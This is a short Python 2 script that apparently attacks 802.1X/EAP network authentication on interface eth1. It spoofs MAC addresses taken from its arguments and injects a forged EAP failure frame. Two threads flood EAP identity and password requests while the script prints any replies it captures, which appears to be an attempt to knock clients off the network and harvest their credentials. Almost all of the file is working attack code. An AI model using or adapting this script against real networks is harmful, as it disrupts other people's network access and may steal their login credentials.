#!/usr/bin/env python

from socket import *
import eapauth
import time
from myThread import MyThread
import sys
import struct

test = "\x00\x1e\x68\xae\x25\x39"

def thread_func():
	cheat = eapauth.EAPAuth(['1','1','eth1'])
	#cheat.set_source()
	while True:
		cheat.send_request_id()
		#cheat.send_response_id(2)
		#cheat.send_start()
		#cheat.send_failure()
		time.sleep(0.05)

def thread_func2():
	cheat = eapauth.EAPAuth(['1','1','eth1'])
	while True:
		cheat.send_request_pass()
		time.sleep(0.02)

def main():
	argv = sys.argv[1:]
	numS = [ int(argv[0][i:i+2], 16) for i in range(0,len(argv[0]),2) ]
	numD = [ int(argv[1][i:i+2], 16) for i in range(0,len(argv[1]),2) ]
	
	src = ''
	dst = ''
	for i in numS:
		src += struct.pack('!B', i)
	for i in numD:
		dst += struct.pack('!B', i)
	back = MyThread(thread_func, [])
	back.start()
	#back.join()
	back2 = MyThread(thread_func2, [])
	back2.start()
	cheat2 = eapauth.EAPAuth(['1','1','eth1'])
	cheat2.set_fake(src, dst)
	cheat2.send_failure()

	while True:
		try:
			print "ok"
			packet = cheat2.client.recv(1600)
			print "ok2"
			print repr(packet)
			#cheat2.send_request_pass()
			#packet = cheat2.client.recv(1600)
			#print repr(packet)
		except:
			print "error"
			pass



if __name__ == '__main__':
	main()
